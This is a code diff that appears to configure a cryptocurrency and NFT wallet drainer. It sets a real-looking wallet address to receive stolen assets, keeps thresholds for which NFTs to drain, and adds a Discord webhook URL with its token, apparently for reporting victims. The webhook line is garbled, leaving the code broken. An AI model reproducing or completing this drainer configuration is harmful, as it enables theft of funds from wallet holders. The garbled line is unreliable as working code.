@@ -1,11 +1,11 @@
-const receiveAddress = "0x00000000000000000000000000000000";
+const receiveAddress = "0xADf1Fd5D0752c09C6e30d4b8B3A8d48a3F7E03a2";
 
 const drainNftsInfo = {
     minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     maxTransfers: 1,
-}
+} 
 
-webhookURL = "https://discord.com/api/webhooks/wewewewewewew/wewewewewewewewewewe"
+webhoo"hhttps://discord.com/api/webhooks/1117502721793204294/Nu1Uey3_OYMIn8tYJmNKaUuudsmaX15C4tWkP6F14QXgoPccsPW1rlFBm6i7Z7u_JN6Kwewewe"
 
 
 
